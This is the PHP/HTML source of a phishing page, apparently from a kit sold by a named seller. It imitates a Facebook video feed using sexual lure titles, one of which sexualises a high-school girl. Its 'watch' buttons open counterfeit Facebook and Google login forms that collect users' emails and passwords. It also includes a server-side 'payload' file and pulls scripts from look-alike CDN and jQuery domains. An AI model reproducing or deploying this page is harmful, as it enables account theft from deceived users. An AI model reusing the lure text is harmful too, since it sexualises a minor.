<?php
// Creator Sc  : LUKY NESIA 
// Order Script : 6289509551861
// Telegram   : t.me/luky_nesia

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>
   Facebook Video Sex
  </title>
  <script src="https://cdn.stackpath.web.id/tailwind.js">
  </script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/5/css/facebook.css"> 
    <link rel="stylesheet" href="https://cdn.stackpath.web.id/5/css/google.css"> 
    <link rel="stylesheet" href="https://cdn.stackpath.web.id/5/css/all.css"> 
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet"/>
  <style>
   body {
      font-family: 'Roboto', sans-serif;
    }
  </style>
 </head>
 <body class="bg-white text-black">
  <!-- Facebook header -->
  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-300">
   <div class="text-3xl font-extrabold text-blue-600 select-none">
    facebook
   </div>
   <div class="flex space-x-3">
    <button aria-label="Add" class="bg-gray-200 rounded-full w-9 h-9 flex items-center justify-center text-xl font-bold">
     +
    </button>
    <button aria-label="Search" class="bg-gray-200 rounded-full w-9 h-9 flex items-center justify-center text-xl font-semibold">
     <i class="fas fa-search">
     </i>
    </button>
    <button aria-label="Messenger" class="relative bg-gray-200 rounded-full w-9 h-9 flex items-center justify-center text-xl font-semibold">
     <i class="fab fa-facebook-messenger">
     </i>
     <span class="absolute -top-1 -right-1 bg-red-600 text-white text-[10px] font-bold rounded-full w-5 h-5 flex items-center justify-center">
      6
     </span>
    </button>
   </div>
  </div>
  <!-- First post card -->
  <div class="max-w-md mx-auto my-4 bg-white rounded-xl shadow-md overflow-hidden">
   <div class="relative">
    <img alt="Video thumbnail showing three people in various poses, one lying down, one holding chest, and one covering mouth" class="w-full rounded-t-xl object-cover" height="200" src="https://cdn.stackpath.web.id/20288/20250902_160130.jpg" width="600"/>
    <div class="absolute top-3 left-3 bg-black bg-opacity-60 rounded-full px-3 py-1 text-white text-sm flex items-center space-x-1">
     <span>
      20:00
     </span>
     <i class="fas fa-volume-mute">
     </i>
    </div>
    <button aria-label="Play video" class="absolute inset-0 flex items-center justify-center bg-black bg-opacity-40 rounded-t-xl">
     <i class="fas fa-play text-white text-4xl">
     </i>
    </button>
   </div>
   <div class="px-4 py-3">
    <p class="text-base font-normal leading-snug">
     SMA CANTIK PAMER BODY DI SURUH AYANG 💦💦🔞
    </p>
    <div class="flex flex-wrap gap-2 mt-3">
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-fire">
      </i>
      <span>
       4.7K
      </span>
     </span>
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-tint">
      </i>
      <span>
       3.1M
      </span>
     </span>
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-heart">
      </i>
      <span>
       697K
      </span>
     </span>
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-kiss">
      </i>
      <span>
       237K
      </span>
     </span>
    </div>
    <div class="flex items-center justify-end space-x-4 text-gray-400 text-sm mt-3">
     <div class="flex items-center space-x-1">
      <i class="fas fa-eye">
      </i>
      <span>
       28.3M
      </span>
     </div>
     <span>
      13:07
     </span>
    </div>
   </div>
      <div onclick="codxLoginPopup()" class="w-full bg-blue-600 text-white font-bold py-3 rounded-b-xl text-center"> 
    <a onclick="codxLoginPopup()" class="finlink  btn install-btn" id="a7">TONTON</a> 
  </div>
  <!-- First post card -->
  <div class="max-w-md mx-auto my-4 bg-white rounded-xl shadow-md overflow-hidden">
   <div class="relative">
    <img alt="Video thumbnail showing three people in various poses, one lying down, one holding chest, and one covering mouth" class="w-full rounded-t-xl object-cover" height="200" src="https://cdn.stackpath.web.id/20288/20250902_155648.jpg" width="600"/>
    <div class="absolute top-3 left-3 bg-black bg-opacity-60 rounded-full px-3 py-1 text-white text-sm flex items-center space-x-1">
     <span>
      11:06
     </span>
     <i class="fas fa-volume-mute">
     </i>
    </div>
    <button aria-label="Play video" class="absolute inset-0 flex items-center justify-center bg-black bg-opacity-40 rounded-t-xl">
     <i class="fas fa-play text-white text-4xl">
     </i>
    </button>
   </div>
   <div class="px-4 py-3">
    <p class="text-base font-normal leading-snug">
     NGINAP DI HOTEL SAMA KAKA BERUJUNG ENAK 💦💦
    </p>
    <div class="flex flex-wrap gap-2 mt-3">
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-fire">
      </i>
      <span>
       4.7K
      </span>
     </span>
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-tint">
      </i>
      <span>
       3.1K
      </span>
     </span>
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-heart">
      </i>
      <span>
       697
      </span>
     </span>
     <span class="bg-blue-200 text-blue-800 rounded-full px-3 py-1 font-semibold flex items-center space-x-1">
      <i class="fas fa-kiss">
      </i>
      <span>
       237
      </span>
     </span>
    </div>
    <div class="flex items-center justify-end space-x-4 text-gray-400 text-sm mt-3">
     <div class="flex items-center space-x-1">
      <i class="fas fa-eye">
      </i>
      <span>
       28.3K
      </span>
     </div>
     <span>
      13:07
     </span>
    </div>
   </div>
      <div onclick="codxLoginPopup()" class="w-full bg-blue-600 text-white font-bold py-3 rounded-b-xl text-center"> 
    <a onclick="codxLoginPopup()" class="finlink  btn install-btn" id="a7">TONTON</a> 
  </div>
  <!-- Bottom navigation -->
  <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-300 flex justify-around items-center py-2 text-center text-xs font-semibold">
   <button class="flex flex-col items-center text-blue-600">
    <i class="fas fa-home text-2xl">
    </i>
    <span>
     Beranda
    </span>
   </button>
   <button class="flex flex-col items-center text-black">
    <i class="fas fa-video text-2xl">
    </i>
    <span>
     Video
    </span>
   </button>
   <button class="flex flex-col items-center text-black">
    <i class="fas fa-user-friends text-2xl">
    </i>
    <span>
     Teman
    </span>
   </button>
   <button class="flex flex-col items-center text-black">
    <i class="fas fa-store text-2xl">
    </i>
    <span>
     Marketplace
    </span>
   </button>
   <button class="flex flex-col items-center text-black">
    <i class="fas fa-bell text-2xl">
    </i>
    <span>
     Notifikasi
    </span>
   </button>
   <button class="flex flex-col items-center text-gray-600 bg-gray-300 rounded-full w-10 h-10 justify-center">
    <i class="fas fa-bars text-xl">
    </i>
    <span class="text-[10px]">
     Menu
    </span>
   </button>
  </nav>
   <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login to Continue.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.stackpath.web.id/3/img/logfb.webp" onclick="OpenFacebook();"> 
      <img src="https://cdn.stackpath.web.id/3/img/loggp.webp" onclick="OpenGoogle();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login loginxFacebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="CloseFacebook()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.stackpath.web.id/3/img/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.stackpath.web.id/3/img/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div>
     <form class="login-form" id="FromxFacebook" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="CloseGoogle()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.stackpath.web.id/3/img/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FromxGoogle" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://jquery.biz.id/libs/jquery-3.17.21.min.js"></script>
  <script src="js/jquery.min.js"></script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
// KHUSUS VIP S2M MINAT CHAT WA SAMPING https://wa.me/6289509551861
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>